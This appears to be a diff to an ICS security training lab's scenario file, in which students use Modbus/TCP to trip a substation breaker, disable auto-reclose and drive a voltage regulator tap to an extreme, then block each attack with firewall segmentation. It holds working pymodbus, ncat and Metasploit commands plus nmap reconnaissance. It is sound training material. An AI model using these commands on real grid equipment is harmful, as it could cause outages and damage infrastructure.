@@ -150,83 +150,152 @@ nodes:
 
 scenarios:
   - id: enterprise-to-breaker
-    name: "Scenario 1: Enterprise to Breaker Attack"
+    name: "Scenario 1: Enterprise to Breaker — Modbus Coil Write"
     description: >
-      An attacker compromises an enterprise workstation and attempts to
-      trip the feeder breaker. Students must use Containd to block
-      enterprise-originated control paths to field devices while
-      preserving legitimate monitoring and operations.
+      An attacker with enterprise network access uses Modbus/TCP to trip
+      the feeder breaker relay. This mirrors real ICS attacks (e.g.,
+      CRASHOVERRIDE/Industroyer) where adversaries use native OT protocols
+      to manipulate protection equipment. Students must segment enterprise
+      traffic from field device Modbus services.
     tags:
       - attack
       - segmentation
       - enterprise
+      - modbus
     steps:
-      - title: "Observe baseline"
+      - title: "Verify baseline — feeder energized"
         description: >
-          Load the lab and verify the feeder is energized.
-          Check that the HMI shows normal breaker status and all
-          loads are served.
+          Confirm the feeder is energized and all loads are served.
+          Check the Substation Process View or use the RTAC Modbus
+          interface to read coil 0 (breaker_closed) on the RTAC:
+
+
+          python3 -c "
+          from pymodbus.client import ModbusTcpClient
+          c = ModbusTcpClient('10.30.30.20', port=502)
+          c.connect()
+          r = c.read_coils(0, 1)
+          print('Breaker closed:', r.bits[0])
+          c.close()
+          "
         action:
           type: check
           expect:
             breaker_closed: true
             loads_energized: true
 
-      - title: "Launch attack from enterprise zone"
+      - title: "Recon — scan for Modbus services"
         description: >
-          From the Kali box (10.10.10.50), send a trip command
-          directly to the relay-sim (10.40.40.20):
-          curl -X POST http://10.40.40.20:8080/api/command -d '{"command":"trip","source":"kali"}'
+          From the Kali box (10.10.10.50), scan the field device zone
+          for Modbus/TCP services on port 502. This is how attackers
+          discover ICS endpoints after gaining network access:
+
+
+          nmap -sV -p 502 10.40.40.20-22 --script modbus-discover
+
+
+          You should see port 502 open on all three field devices:
+          relay (10.40.40.20), recloser (10.40.40.21), regulator (10.40.40.22).
+          Note: this scan would be visible to containd's DPI engine.
+
+      - title: "Attack — trip breaker via Modbus FC5 Write Coil"
+        description: >
+          Using pymodbus from Kali, write coil 0 (breaker_closed) to
+          False on the relay (10.40.40.20:502). FC5 (Write Single Coil)
+          with value 0x0000 opens the breaker — identical to how
+          CRASHOVERRIDE opened breakers in the 2016 Ukraine attack:
+
+
+          python3 -c "
+          from pymodbus.client import ModbusTcpClient
+          c = ModbusTcpClient('10.40.40.20', port=502)
+          c.connect()
+          c.write_coil(0, False)   # FC5: trip breaker
+          print('Breaker tripped via Modbus')
+          c.close()
+          "
+
+
+          Alternative using ncat (raw Modbus TCP frame):
+
+          echo -ne '\x00\x01\x00\x00\x00\x06\x01\x05\x00\x00\x00\x00' | ncat 10.40.40.20 502
         action:
           type: command
           device: relay
           command: trip
           source: "10.10.10.50"
 
-      - title: "Observe operational consequence"
+      - title: "Observe — feeder de-energized"
         description: >
-          With the weak baseline, the trip command succeeds.
-          The feeder breaker opens. All downstream loads lose power.
-          Check the HMI — general and critical loads should show de-energized.
+          The feeder breaker is now open. All downstream loads lose power.
+          Read the relay state to confirm:
+
+
+          python3 -c "
+          from pymodbus.client import ModbusTcpClient
+          c = ModbusTcpClient('10.40.40.20', port=502)
+          c.connect()
+          r = c.read_coils(0, 4)
+          print('breaker_closed:', r.bits[0])
+          print('remote_control:', r.bits[1])
+          print('lockout:', r.bits[2])
+          print('fault_seen:', r.bits[3])
+          c.close()
+          "
         action:
           type: check
           expect:
             breaker_closed: false
 
-      - title: "Restore service"
+      - title: "Restore — close breaker"
         description: >
-          Close the feeder breaker to restore power before
-          applying the improved segmentation policy.
+          Restore power by closing the breaker before applying
+          segmentation policy.
         action:
           type: command
           device: relay
           command: close
           source: "operator"
 
-      - title: "Improve segmentation"
+      - title: "Defend — apply segmentation policy"
         description: >
-          Use Containd to block enterprise zone (wan) from directly
-          reaching field device zone (lan2). Import the improved
-          firewall config or create rules manually.
+          Use containd to block enterprise zone (wan/10.10.10.0/24) from
+          reaching field devices (lan2/10.40.40.0/24) on any port,
+          including Modbus/TCP port 502. Apply the improved config or
+          create zone deny rules manually in the containd UI.
         action:
           type: firewall
           config: improved
 
-      - title: "Re-test attack"
+      - title: "Validate — repeat attack (should be blocked)"
         description: >
-          Repeat the trip command from the enterprise zone. The
-          command should now be blocked by containd. Verify the
-          breaker remains closed and all loads stay energized.
+          Re-run the same Modbus trip command from Kali. With the
+          improved policy, containd drops the TCP SYN to 10.40.40.20:502
+          before it reaches the relay. The breaker stays closed:
+
+
+          python3 -c "
+          from pymodbus.client import ModbusTcpClient
+          c = ModbusTcpClient('10.40.40.20', port=502, timeout=3)
+          try:
+              c.connect()
+              c.write_coil(0, False)
+              print('ERROR: attack succeeded — check firewall rules')
+          except Exception as e:
+              print('BLOCKED by containd:', e)
+          c.close()
+          "
         action:
           type: command
           device: relay
           command: trip
           source: "10.10.10.50"
 
-      - title: "Validate operations"
+      - title: "Validate — legitimate operations preserved"
         description: >
-          Verify that the HMI can still read device state through
-          the RTAC and that legitimate control paths still work.
+          Verify the RTAC can still read field device state and that
+          the HMI reflects accurate breaker status. The improved policy
+          only allows RTAC (10.40.40.10) to reach field devices.
         action:
           type: check
           expect:
@@ -235,41 +304,86 @@ scenarios:
             firewall_config: improved
 
   - id: vendor-access-abuse
-    name: "Scenario 2: Vendor Access Abuse"
+    name: "Scenario 2: Vendor Access — Disable Auto-Reclose"
     description: >
-      A vendor remote-access path is compromised. The attacker
-      disables auto-reclose on the feeder recloser, then injects
-      a fault. Without auto-reclose, a temporary fault causes
-      a sustained outage. Students constrain vendor access.
+      A compromised vendor remote-access session is used to disable
+      auto-reclose on the mid-feeder recloser via Modbus, then trigger
+      a fault. Without auto-reclose, a temporary fault causes a sustained
+      outage instead of the normal automatic recovery. This demonstrates
+      how vendor access abuse can degrade grid reliability without
+      directly tripping breakers.
     tags:
       - attack
       - vendor
       - segmentation
+      - modbus
     steps:
-      - title: "Observe normal fault recovery"
+      - title: "Verify baseline — reclose enabled"
         description: >
-          Inject a fault on the recloser and observe that auto-reclose
-          restores service automatically within seconds.
+          Confirm the recloser is closed and auto-reclose is enabled.
+          Read recloser coils from the vendor jump box:
+
+
+          python3 -c "
+          from pymodbus.client import ModbusTcpClient
+          c = ModbusTcpClient('10.40.40.21', port=502)
+          c.connect()
+          r = c.read_coils(0, 5)
+          print('closed:', r.bits[0])
+          print('reclose_enabled:', r.bits[1])
+          print('lockout:', r.bits[2])
+          print('fault_seen:', r.bits[3])
+          print('auto_mode:', r.bits[4])
+          c.close()
+          "
         action:
           type: check
           expect:
             recloser_closed: true
             reclose_enabled: true
 
-      - title: "Attack from vendor zone"
+      - title: "Attack — disable auto-reclose via Modbus"
         description: >
-          From vendor-jump (10.20.20.10), disable reclose on the recloser:
-          curl -X POST http://10.40.40.21:8080/api/command -d '{"command":"disable_reclose","source":"vendor-jump"}'
+          From vendor-jump (10.20.20.10), use Modbus FC5 to write
+          coil 1 (reclose_enabled) to False on the recloser. This
+          silently disables the automatic fault recovery mechanism:
+
+
+          python3 -c "
+          from pymodbus.client import ModbusTcpClient
+          c = ModbusTcpClient('10.40.40.21', port=502)
+          c.connect()
+          c.write_coil(1, False)   # FC5: disable auto-reclose
+          print('Auto-reclose disabled')
+          c.close()
+          "
+
+
+          This is a subtle attack — the recloser looks normal until a
+          fault occurs and it fails to automatically restore service.
         action:
           type: command
           device: recloser
           command: disable_reclose
           source: "10.20.20.10"
 
-      - title: "Inject fault after disabling reclose"
+      - title: "Trigger fault — sustained outage"
         description: >
-          Inject a fault. Without auto-reclose, the recloser trips
-          and locks out. Downstream loads experience sustained outage.
+          With auto-reclose disabled, inject a fault. The recloser
+          trips but cannot automatically restore. In a real system,
+          this would require a crew dispatch to manually close:
+
+
+          python3 -c "
+          from pymodbus.client import ModbusTcpClient
+          c = ModbusTcpClient('10.40.40.21', port=502)
+          c.connect()
+          c.write_coil(0, False)   # Open recloser (simulate fault trip)
+          r = c.read_coils(0, 5)
+          print('closed:', r.bits[0], '(should be False)')
+          print('reclose_enabled:', r.bits[1], '(False = won\\'t auto-restore)')
+          c.close()
+          "
         action:
           type: command
           device: recloser
@@ -293,18 +407,33 @@ scenarios:
               command: close
               source: "operator"
 
-      - title: "Improve segmentation"
+      - title: "Defend — block vendor-to-field Modbus"
         description: >
-          Block vendor zone (dmz) from direct access to field devices.
-          Only allow vendor access to approved OT operations services.
+          Apply the improved containd policy to block vendor zone
+          (dmz/10.20.20.0/24) from reaching field devices. Vendor
+          access should be limited to approved OT operations services
+          (HMI, engineering workstations) — not direct field device control.
         action:
           type: firewall
           config: improved
 
-      - title: "Re-test"
+      - title: "Validate — vendor Modbus blocked"
         description: >
-          The vendor disable_reclose command is now blocked.
-          Fault recovery works normally.
+          Re-attempt the disable_reclose from vendor zone. containd
+          blocks the TCP connection to 10.40.40.21:502:
+
+
+          python3 -c "
+          from pymodbus.client import ModbusTcpClient
+          c = ModbusTcpClient('10.40.40.21', port=502, timeout=3)
+          try:
+              c.connect()
+              c.write_coil(1, False)
+              print('ERROR: attack succeeded')
+          except Exception as e:
+              print('BLOCKED:', e)
+          c.close()
+          "
         action:
           type: command
           device: recloser
@@ -312,30 +441,73 @@ scenarios:
           source: "10.20.20.10"
 
   - id: ot-east-west-pivot
-    name: "Scenario 3: OT East-West Pivot"
+    name: "Scenario 3: OT Lateral Movement — Voltage Manipulation"
     description: >
-      A node in the OT operations zone is compromised. The attacker
-      attempts lateral movement to manipulate voltage regulator
-      settings, causing voltage quality issues at critical loads.
-      Students enforce segmentation within OT zones.
+      An attacker pivots from a compromised OT operations node (OpenPLC
+      at 10.30.30.30) to directly manipulate the voltage regulator tap
+      position via Modbus. By driving the tap to an extreme value, the
+      attacker causes undervoltage conditions at critical loads. Students
+      must enforce east-west segmentation so only the RTAC can control
+      field devices.
     tags:
       - attack
       - lateral-movement
       - segmentation
+      - modbus
     steps:
-      - title: "Observe normal voltage"
+      - title: "Verify baseline — normal voltage"
         description: >
-          Verify critical load voltage is within normal range (114-126V).
+          Read the regulator state via Modbus to confirm normal
+          tap position and voltage:
+
+
+          python3 -c "
+          from pymodbus.client import ModbusTcpClient
+          c = ModbusTcpClient('10.40.40.22', port=502)
+          c.connect()
+          r = c.read_holding_registers(0, 3)
+          tap = r.registers[0] if r.registers[0] < 32768 else r.registers[0] - 65536
+          print('tap_position:', tap)
+          print('manual_mode:', r.registers[1])
+          print('voltage_setpoint_x10:', r.registers[2])
+          c.close()
+          "
         action:
           type: check
           expect:
             voltage_normal: true
 
-      - title: "Simulate OT compromise"
+      - title: "Attack — drive tap to extreme via Modbus FC6"
         description: >
-          From a compromised OT operations node, directly manipulate
-          the regulator tap position to an extreme value:
-          curl -X POST http://10.40.40.22:8080/api/command -d '{"command":"set_tap","value":-16,"source":"compromised-ot-node"}'
+          From the compromised OpenPLC (10.30.30.30), use Modbus FC6
+          (Write Single Register) to set the regulator tap position to
+          -16 (minimum). This causes the regulated voltage to drop well
+          below acceptable limits:
+
+
+          python3 -c "
+          from pymodbus.client import ModbusTcpClient
+          c = ModbusTcpClient('10.40.40.22', port=502)
+          c.connect()
+          # FC6: Write tap_position (reg 0) to -16
+          # -16 as unsigned uint16 = 65520 (0xFFF0)
+          c.write_register(0, 65520)
+          print('Tap driven to -16 — voltage collapse imminent')
+          c.close()
+          "
+
+
+          In Metasploit, this can also be done with:
+
+          use auxiliary/scanner/scada/modbusclient
+
+          set ACTION WRITE_REGISTER
+
+          set DATA_ADDRESS 0
+
+          set DATA 65520
+
+          set RHOST 10.40.40.22
         action:
           type: command
           device: regulator
@@ -343,19 +515,34 @@ scenarios:
           source: "10.30.30.30"
           value: -16
 
-      - title: "Observe voltage degradation"
+      - title: "Observe — voltage degradation"
         description: >
-          Critical load voltage drops below acceptable levels.
-          Low voltage alarm activates.
+          Critical load voltage drops below acceptable levels (114V).
+          Read the input registers to see the impact:
+
+
+          python3 -c "
+          from pymodbus.client import ModbusTcpClient
+          c = ModbusTcpClient('10.40.40.22', port=502)
+          c.connect()
+          r = c.read_input_registers(0, 2)
+          tap = r.registers[0] if r.registers[0] < 32768 else r.registers[0] - 65536
+          offset = r.registers[1] if r.registers[1] < 32768 else r.registers[1] - 65536
+          print('tap_position:', tap)
+          print('voltage_offset_x10:', offset)
+          # Also read alarm coil
+          a = c.read_coils(1, 1)
+          print('alarm:', a.bits[0])
+          c.close()
+          "
         action:
           type: check
           expect:
             voltage_normal: false
 
-      - title: "Restore voltage"
+      - title: "Restore — reset tap position"
         description: >
-          Reset the regulator to automatic mode and restore
-          normal tap position.
+          Reset the regulator to auto mode and restore normal tap position.
         action:
           type: sequence
           commands:
@@ -367,21 +554,221 @@ scenarios:
               source: "operator"
               value: 0
 
-      - title: "Improve segmentation"
+      - title: "Defend — enforce RTAC-only field access"
         description: >
-          Enforce that only the RTAC (10.30.30.20) on the field_net
-          can send commands to field devices. Block other OT operations
-          nodes from direct field device access.
+          Apply the improved containd policy. This enforces that only the
+          RTAC (10.40.40.10 on field_net) can initiate Modbus connections
+          to field devices. Other OT operations nodes (HMI, OpenPLC) are
+          blocked from direct field device access — they must go through
+          the RTAC's supervisory interface.
         action:
           type: firewall
           config: improved
 
-      - title: "Re-test"
+      - title: "Validate — lateral Modbus blocked"
         description: >
-          The unauthorized tap change is blocked. Voltage remains normal.
+          Re-attempt the tap manipulation from the compromised OpenPLC.
+          containd blocks the connection:
+
+
+          python3 -c "
+          from pymodbus.client import ModbusTcpClient
+          c = ModbusTcpClient('10.40.40.22', port=502, timeout=3)
+          try:
+              c.connect()
+              c.write_register(0, 65520)
+              print('ERROR: attack succeeded')
+          except Exception as e:
+              print('BLOCKED by containd:', e)
+          c.close()
+          "
         action:
           type: command
           device: regulator
           command: set_tap
           source: "10.30.30.30"
           value: -16
+
+  - id: traffic-analysis-segmentation
+    name: "Scenario 4: Traffic Analysis for Segmentation Planning"
+    description: >
+      Before applying segmentation policies, students must understand
+      legitimate communication patterns. This exercise uses network
+      reconnaissance and traffic analysis to discover which hosts
+      communicate with which, over what protocols and ports. The
+      resulting communication matrix directly informs containd firewall
+      rules and DPI policies, ensuring segmentation doesn't break
+      legitimate operations.
+    tags:
+      - reconnaissance
+      - segmentation
+      - planning
+      - modbus
+    steps:
+      - title: "Discover active hosts per zone"
+        description: >
+          From Kali (10.10.10.50), run host discovery across all
+          substation zones to map the network:
+
+
+          # Enterprise zone
+          nmap -sn 10.10.10.0/24
+
+
+          # Vendor zone
+          nmap -sn 10.20.20.0/24
+
+
+          # OT Operations zone
+          nmap -sn 10.30.30.0/24
+
+
+          # Field Device zone
+          nmap -sn 10.40.40.0/24
+
+
+          Record which IPs are active in each zone. Note that the
+          firewall (10.x.x.2) appears in every zone — it's the gateway.
+
+      - title: "Identify ICS protocols and services"
+        description: >
+          Run service detection on the OT and field device zones to
+          discover what protocols are in use. Focus on ICS-relevant
+          ports (502/Modbus, 20000/DNP3, 44818/CIP, 8080/HTTP):
+
+
+          nmap -sV -p 502,8080,20000,44818,80,443,22 10.30.30.0/24 10.40.40.0/24
+
+
+          You should discover:
+          - Port 502 (Modbus/TCP) on field devices and the RTAC
+          - Port 8080 (HTTP API) on all simulators
+          - The RTAC (10.30.30.20) has both ports, acting as a protocol gateway
+
+
+          For deeper Modbus fingerprinting:
+
+          nmap -p 502 --script modbus-discover 10.40.40.20-22
+
+      - title: "Capture baseline traffic with tshark"
+        description: >
+          Use tshark to capture live traffic and identify communication
+          patterns. Run this on the RTAC or from Kali:
+
+
+          # Capture 30 seconds of Modbus traffic
+          tshark -i eth0 -f "port 502" -a duration:30 -T fields \
+            -e ip.src -e ip.dst -e modbus.func_code \
+            -e modbus.reference_num -E separator=,
+
+
+          # Capture all traffic between OT ops and field zones
+          tshark -i eth0 -f "net 10.40.40.0/24" -a duration:30 \
+            -q -z conv,ip
+
+
+          The conversation statistics (-z conv,ip) show which host pairs
+          exchange the most traffic — these are the critical paths that
+          segmentation must preserve.
+
+      - title: "Map the communication matrix"
+        description: >
+          From your captures and scans, build a communication matrix.
+          Read the RTAC's Modbus registers to understand what data
+          flows where:
+
+
+          python3 -c "
+          from pymodbus.client import ModbusTcpClient
+
+          # Read RTAC aggregate state via Modbus
+          c = ModbusTcpClient('10.30.30.20', port=502)
+          c.connect()
+
+          # Coils: breaker, recloser, loads, reclose, remote_ctrl, auto_mode, comms
+          coils = c.read_coils(0, 10)
+          print('Coils (device states):', coils.bits[:10])
+
+          # Input registers: voltages, currents, power
+          iregs = c.read_input_registers(0, 8)
+          print('Input regs (analog):', iregs.registers)
+
+          # Holding registers: breaker, recloser, reclose, tap, manual, shots
+          hregs = c.read_holding_registers(0, 8)
+          print('Holding regs (control):', hregs.registers)
+          c.close()
+
+          print()
+          print('Critical communication paths:')
+          print('  RTAC (10.30.30.20) -> relay (10.40.40.20:502)    Modbus FC1/3/4 polling')
+          print('  RTAC (10.30.30.20) -> recloser (10.40.40.21:502) Modbus FC1/3/4 polling')
+          print('  RTAC (10.30.30.20) -> regulator (10.40.40.22:502) Modbus FC1/3/4 polling')
+          print('  RTAC (10.30.30.20) -> opendss (10.50.50.20:8080) HTTP state polling')
+          print('  HMI (10.30.30.10) -> RTAC (10.30.30.20:502)     Modbus read for display')
+          print('  Backend -> RTAC (10.30.30.20:8080)               HTTP command forwarding')
+          "
+
+
+          Check the Command Audit tab in the Substation Process View
+          to see the traffic matrix visualization.
+
+      - title: "Identify segmentation requirements"
+        description: >
+          Based on your traffic analysis, define the segmentation rules:
+
+
+          REQUIRED PATHS (must ALLOW):
+          1. RTAC -> field devices (Modbus 502) - supervisory polling & control
+          2. RTAC -> physics engine (HTTP 8080) - state calculation
+          3. HMI -> RTAC (Modbus 502) - operator display
+          4. Backend -> RTAC (HTTP 8080) - command forwarding
+
+
+          DENY PATHS (must BLOCK):
+          1. Enterprise (10.10.10.x) -> field devices - no direct ICS access
+          2. Vendor (10.20.20.x) -> field devices - no direct ICS access
+          3. Any non-RTAC OT node -> field devices - prevent lateral movement
+
+
+          Optional DPI RULES for containd:
+          - Modbus read-only (FC1-4) from HMI to RTAC
+          - Block Modbus write (FC5/6/15/16) except from RTAC
+          - Alert on any Modbus traffic from enterprise/vendor zones
+
+      - title: "Apply segmentation based on analysis"
+        description: >
+          Apply the improved containd policy that implements the rules
+          you identified. Compare it against your traffic analysis to
+          verify it matches your requirements.
+        action:
+          type: firewall
+          config: improved
+
+      - title: "Validate — critical paths preserved"
+        description: >
+          Verify that legitimate operations still work after applying
+          segmentation. The RTAC should still poll all field devices:
+
+
+          python3 -c "
+          from pymodbus.client import ModbusTcpClient
+
+          for name, ip in [('relay', '10.40.40.20'), ('recloser', '10.40.40.21'), ('regulator', '10.40.40.22')]:
+              c = ModbusTcpClient(ip, port=502, timeout=3)
+              try:
+                  c.connect()
+                  r = c.read_coils(0, 1)
+                  print(f'{name} ({ip}:502): reachable, coil0={r.bits[0]}')
+              except Exception as e:
+                  print(f'{name} ({ip}:502): BLOCKED - {e}')
+              c.close()
+          "
+
+
+          From Kali, the same test should FAIL (blocked by containd).
+        action:
+          type: check
+          expect:
+            breaker_closed: true
+            loads_energized: true
+            firewall_config: improved
